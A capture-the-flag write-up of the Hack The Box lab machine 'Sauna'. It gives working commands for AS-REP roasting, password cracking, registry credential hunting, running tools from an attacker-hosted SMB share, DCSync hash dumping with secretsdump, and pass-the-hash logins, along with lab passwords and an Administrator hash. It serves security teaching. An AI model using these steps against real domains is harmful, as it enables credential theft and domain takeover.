# Machine Overview

Sauna was an easy-rated Windows machine that involved exploiting the **As-Rep Roasting** attack to find the hash of the **fsmith** user, which was cracked using **hashcat**. For lateral movement, we obtained the clear text password of the **svc_loanmgr** user from Winlogon. **svc_loanmgr** has **DCSync** rights on the domain, which we used to dump the user's hashes and perform a **pass-the-hash** attack to gain access to the administrator account.

## Scanning through Nmap

First, we'll use **nmap** to scan the entire network and identify the services running. I'll use the **-p-** flag to scan all **65535** ports with a **--min-rate 10000** to speed up the process. After scanning, we'll filter the results to show only the open ports using various terminal tools like **cut** and **tr**. Here's the complete command:

```bash
$ nmap -p- --min-rate 10000 10.10.10.175 -oN ini.txt && cat ini.txt | cut  -d ' ' -f1 | tr -d '/tcp' | tr '\n' ','
```
<img  alt="Pasted image 20240108215233" src="https://github.com/iammR0OT/HTB/assets/74102381/941b74ce-1496-4a6c-a53b-ac4c085ebdf4">


<img  alt="Pasted image 20240108215332" src="https://github.com/iammR0OT/HTB/assets/74102381/614821d2-7964-4169-91a1-c41895daf13f">

Now, let's run a thorough scan on these specific ports using...

```bash
$ nmap -p53,80,88,135,139,389,445,464,593,636,3268,3269,5985,9389,49668,49673,49674,49675,49721,49744 -sC -sV -A -T4 10.10.10.175 -oN scan.txt
```

 - **-sC** is to run all the default scripts,
 - **-sV** for service and version detection
 - **-A** for Enable OS detection, version detection, script scanning, and traceroute
 - **-T4** for aggressive scan 
 - **-oN** to write the result into a specified file.

## Information Gathering

Through Nmap, we discovered that port 53 (DNS) is open, which can be used to perform zone transfers. Port 80 (HTTP) is also open, along with port 88 (Kerberos), which can be useful for enumeration purposes. Additionally, ports 139 and 445 (SMB) are open, allowing enumeration of shares with anonymous user access for initial entry. Port 389 (LDAP) is open, as well as port 5985 (WinRM), which can facilitate machine login with valid credentials. Nmap identified the domain name as **EGOTISTICAL-BANK.LOCAL** using LDAP scripts. Let's add this information to our local DNS file called `/etc/hosts` for domain resolution on our computer.

<img  alt="Pasted image 20240108221312" src="https://github.com/iammR0OT/HTB/assets/74102381/b376b49e-1ea4-4dae-9b8e-db65078afe71">

### Port 53 DNS
  
Let's start by exploring port **53** (DNS) and attempt to perform a zone transfer using **dig** (**Domain Information Grabber**, used for retrieving information about DNS name servers. It is used for verifying and troubleshooting DNS problems and to perform DNS lookups). The command to perform the zone transfer is `dig axfr @10.10.10.175 EGOTISTICAL-BANK.LOCAL`. Here, **axfr** is a protocol used for zone transfers, allowing replication of DNS data across multiple DNS servers. However, we were unable to retrieve any useful information.

<img  alt="Pasted image 20240108221501" src="https://github.com/iammR0OT/HTB/assets/74102381/4a8955ed-0dbd-47a3-b53a-7d6c2390a47a">

### Port 80 http

Now, let's move on to the next port, which is port **80** (HTTP). A simple bank website is running on this port, and it appears to be static, with no interaction with user input.

<img  alt="Pasted image 20240108222319" src="https://github.com/iammR0OT/HTB/assets/74102381/5c3d79bb-5e00-4c89-895e-5ea96c0b2168">

After scrolling down, I found the names of team members at the bank. These names could be very beneficial for us to perform an **AS-Rep Roasting** attack to check if any of the users have the privilege "Do Not Require Pre-Authentication". However, I'm not sure about the naming convention used inside the bank. Typically, it follows the format `<First Initial><Last Name>`. So, our username in the domain would be:
	1. fsmith
	2. scoins
	3. sdriver
	4. btylor
	5. hbear
	6. skerb

<img  alt="Pasted image 20240108222605" src="https://github.com/iammR0OT/HTB/assets/74102381/1ffe0ed2-2927-4580-813f-f8372a80de05">

### Port 88 Kerberose

We will take a look at these users in the exploitation phase. Let's move towards our next enumeration step, which is port **88** Kerberos. We can use it to enumerate users because we don't have any valid credentials yet. To enumerate users in the domain, we will use a tool called **kerbrute**. It's a tool used to quickly brute-force and enumerate valid Active Directory accounts through Kerberos Pre-Authentication. It can also be used to perform password spraying on the domain if we manage to find a valid password. **Kerbrute** provides us with many functions, including:

```
Available Commands:
  bruteforce    Bruteforce username:password combos, from a file or stdin
  bruteuser     Bruteforce a single user's password from a wordlist
  help          Help about any command
  passwordspray Test a single password against a list of users
  userenum      Enumerate valid domain usernames via Kerberos
  version       Display version info and quit
```

We will be using that **userenum** function. The command we will use will be 
```bash
$ kerbrute userenum -d EGOTISTICAL-BANK.LOCAL  /usr/share/seclists/SecLists-master/Usernames/xato-net-10-million-usernames.txt --dc 10.10.10.175
``` 

- **-d** is for domain name
- **--dc** for domain controller.

Kerbrute found some valid accounts like **fsmit**, which we discovered before, and also identified that the user **fsmith** has the permission of **"Do Not Require Pre Authentication"**. We can exploit this vulnerability.

```bash
$ kerbrute userenum -d EGOTISTICAL-BANK.LOCAL  /usr/share/seclists/SecLists-master/Usernames/xato-net-10-million-usernames.txt --dc 10.10.10.175

2024/01/08 17:46:00 >  [+] VALID USERNAME:	 fsmith@EGOTISTICAL-BANK.LOCAL
```

We can crack this password and log in to the machine using **evil-winrm**, as we discovered before that port **5985 winrm** is enabled.

### Port 389 Ldap

Using **ldapsearch**, we can enumerate users in the domain and discover the [naming context](https://en.wikipedia.org/wiki/Naming_Context), etc. Let's first discover the naming context of the domain. The command will be:

```bash
$ ldapsearch  -x -H ldap://10.10.10.175 -s base namingcontexts
```

- **-x** for simple authentication
- **-H** for host
- **-s** to set scope to base 
- **namingcontext** for getting naming context of domain

```bash
$ ldapsearch  -x -H ldap://10.10.10.175 -s base namingcontexts 
# extended LDIF
#
# LDAPv3
# base <> (default) with scope baseObject
# filter: (objectclass=*)
# requesting: namingcontexts 
#
dn:
namingcontexts: DC=EGOTISTICAL-BANK,DC=LOCAL
namingcontexts: CN=Configuration,DC=EGOTISTICAL-BANK,DC=LOCAL
namingcontexts: CN=Schema,CN=Configuration,DC=EGOTISTICAL-BANK,DC=LOCAL
namingcontexts: DC=DomainDnsZones,DC=EGOTISTICAL-BANK,DC=LOCAL
namingcontexts: DC=ForestDnsZones,DC=EGOTISTICAL-BANK,DC=LOCAL
```

### Port 139 & 445 SMB

We also have SMB ports open. Let's try to list out SMB shares if they are available publicly using **smbclient**. The command will be `smbclient -L \\10.10.10.175`. Here, **-L** is used to list shares. However, there are no shares available for us.

```bash
$ smbclient -L \\10.10.10.175
Password for [WORKGROUP\kali]:
Anonymous login successful

	Sharename       Type      Comment
	---------       ----      -------
Reconnecting with SMB1 for workgroup listing.
do_connect: Connection to 10.10.10.175 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)
Unable to connect with SMB1 -- no workgroup available
```

## Exploitation

Now, moving on to the exploitation phase, we have a list of users, and Kerbrute has identified that the user **fsmit** has the permission **"Do Not Require Pre Authentication."** This permission can be exploited using an **AS-REP Roasting** attack. AS-REP Roasting allows attacker to steal the password hashes of user accounts with **Kerberos preauthentication disabled**, meaning they don't need to provide their password to log into the domain. Attackers can then attempt to crack these hashes offline. 

For exploitation, we'll use a tool called **GetNPUsers.py** from the **Impacket** toolkit. GetNPUsers.py allows us to retrieve domain users hash who have `Do not require Kerberos preauthentication` set and request their TGTs without knowing their passwords.

Let's try to crack it using **hashcat**.

```bash
$ hashcat hashes rockyou.txt
``` 

 we successfully able to crack the password
	`Thestrokes23`
	
<img alt="Pasted image 20240109005140" src="https://github.com/iammR0OT/HTB/assets/74102381/ac04263e-e476-4566-96de-60b82fbbb0d1">

### Shell as fsmith

As we discovered through Nmap that the WinRM port 3985 is open, we can use a tool called **Evil-WinRM** to log in to the **fsmith** account.

```bash
$ evil-winrm -i 10.10.10.175 -u fsmith -p Thestrokes23
```

- **-i** for domain IP
- **-u** for user name 
- **-p** for user password.

<img alt="Pasted image 20240109005709" src="https://github.com/iammR0OT/HTB/assets/74102381/766193b5-cb5a-4152-8ecd-1667827ce8c5">

# Privilege Escalation

## Enumeration using Winpeas

As when we get shell into a Windows domain machine, the very first thing that comes to mind is to check the valid user accounts running in the Domain environment. We found only four valid user accounts: **Administrator**, **fsmith**, **hsmith**, and **svc_loanmgr**.

```powershell
*Evil-WinRM* PS C:\Users\FSmith\Documents> net user

User accounts for \\

-------------------------------------------------------------------------------
Administrator            FSmith                   Guest
HSmith                   krbtgt                   svc_loanmgr
The command completed with one or more errors.
```

After discovering users, let's run **WinPEAS.exe**. WinPEAS is a compilation of local Windows privilege escalation scripts that check for cached credentials, user accounts, access controls, interesting files, registry permissions, service accounts, patch levels, and more. To do this, we first need to run an **SMB server** on our attacking machine to host shares that we can access on the victim machine. For this purpose, we will be using a script called **smbserver.py** from the Impacket toolkit.

```bash
$ sudo smbserver.py myshares ~/tools/AD -username ab -password ab -smb2support 
Impacket v0.9.19 - Copyright 2019 SecureAuth Corporation

[*] Config file parsed
[*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0

[*] Config file parsed
[*] Config file parsed

```

Now mount the shares on victim machine so that we can access it there. 

```bash
$ net use \\10.10.16.28\myshares /u:ab ab
The command completed successfully.

*Evil-WinRM* PS C:\Users\FSmith\Documents> cd \\10.10.16.28\myshares
*Evil-WinRM* PS Microsoft.PowerShell.Core\FileSystem::\\10.10.16.28\myshares>
```

Now, run **WinPEAS** on the victim machine and save the output file "suana_peas" into our shares so that we can read it on our attacker machine. However, I didn't find any useful information there. So, next, I decided to hunt for credentials on the domain. Here is a great source for [password hunting](https://juggernaut-sec.com/password-hunting/) written by **Juggernaut Pentesting Academy**. In the registry keys part, I found a registry name **winlogon**, which is used to store credentials tied to a setting in Windows called **Autologon**. **Autologon** enables you to easily configure Windows’ built-in autologon mechanism. If the autologon feature of Windows is enabled, then the password will be stored in clear text.

```powershell
*Evil-WinRM* PS Microsoft.PowerShell.Core\FileSystem::\\10.10.16.28\myshares> reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon"

    DisableLockWorkstation    REG_DWORD    0x0
    DefaultPassword    REG_SZ    Moneymakestheworldgoround!
```

Through this, I found that a user named `svc_loanmanager` has the autologon feature enabled, and its clear text password is `Moneymakestheworldgoround!`. This loanmanager account is very similar to the account present in the domain called **svc_loanmgr** which we discovered before. Now we can move horizontally to our next user called **svc_loanmgr**. Let's log into it using **evil-winrm** with these credentials. 

```powershell
$ evil-winrm -i 10.10.10.175 -u svc_loanmgr -p Moneymakestheworldgoround!

```

Now that we're in the `loan_manager` account, let's run SharpHound, an investigator used to gather information from all over the domain. SharpHound is preferable for loot. Run the command `./SharpHound.exe --CollectionMethods All`. After it completes, download it to your local machine, and run BloodHound. Upload the data to BloodHound and start investigating the graphs. We will run SharpHound the same way we ran WinPEAS before.

<img  alt="Pasted image 20240109135044" src="https://github.com/iammR0OT/HTB/assets/74102381/a23cea85-f911-4b58-825b-4e394db0ade9">

To run BloodHound, we first need to start **Neo4j**, a graph database system. Then, upload the data collected by **SharpHound** to **BloodHound**.

<img alt="Pasted image 20240109135359" src="https://github.com/iammR0OT/HTB/assets/74102381/fbdac531-588e-46a3-b495-2a8d6aae55ee">

  
To start BloodHound, open a new terminal and type `bloodhound`, then press Enter. If it's your first time running BloodHound, you'll need to reset the default credentials, which are `neo4j:neo4j`. After logging in, upload the zip file created by SharpHound. You can either drag and drop the file into BloodHound or use the "Upload Data" button. Wait for the data to upload into the database.

<img alt="Pasted image 20240109135829" src="https://github.com/iammR0OT/HTB/assets/74102381/b8863678-1e0f-4c42-b45a-9996f2234f4a">

After successfully uploading the data, it's time to start the investigation. Use the search bar to find both users **fsmith** and **svc_loanmgr**, then right-click on each user and select **Mark User as Owned**.

<img alt="Pasted image 20240109140030" src="https://github.com/iammR0OT/HTB/assets/74102381/02e7b87b-5c70-4e62-8110-62a044b4fb7f">

Now, navigate to the Analysis tab and under the **Shortest Path** tab, select **Shortest Path to Domain Admins** from owned Principals. Here, we can see a graph indicating that our user **svc_loanmgr** has **DcSync** rights on the Domain. A DCSync attack involves using commands in **Microsoft Directory Replication Service Remote Protocol** (MS-DRSR) to mimic a domain controller (DC) and retrieve user credentials from another DC.

## Exploitation

**DCSync** occurs due to MS-DRSR (**Microsoft Directory Replication Service Remote Protocol**), which is responsible for replicating data between different domain controllers so that they have real-time data of all users in the Active Directory (AD). In a **DCSync** attack, the attacker impersonates a domain controller and requests user credentials stored in the domain. To exploit this vulnerability, we will use a tool called **secretsdump.py** from the Impacket toolkit.

```bash
$ secretsdump.py 'EGOTISTICAL-BANK/svc_loanmgr:Moneymakestheworldgoround!@10.10.10.175'

## Pass-The-Hash attack

Now that we have obtained the NTLM hash for the **Administrator user**, we can perform a pass-the-hash attack using various tools such as **wmiexec**, **psexec**, and **evil-winrm**.

### Using wmiexec

```bash
$ wmiexec.py 'EGOTISTICAL-BANK/Administrator@10.10.10.175' -hashes 'aad3b435b51404eeaad3b435b51404ee:823452073d75b9d1cf70ebdf86c7f98e'

### Using psexec

```bash
$ psexec.py 'EGOTISTICAL-BANK/Administrator@10.10.10.175' -hashes 'aad3b435b51404eeaad3b435b51404ee:823452073d75b9d1cf70ebdf86c7f98e'

### Using Evil-winrm

In **evil-winrm**, we only use the NT part of the hash for authentication.

```bash
$ evil-winrm -i 10.10.10.175 -u Administrator -H 823452073d75b9d1cf70ebdf86c7f98e
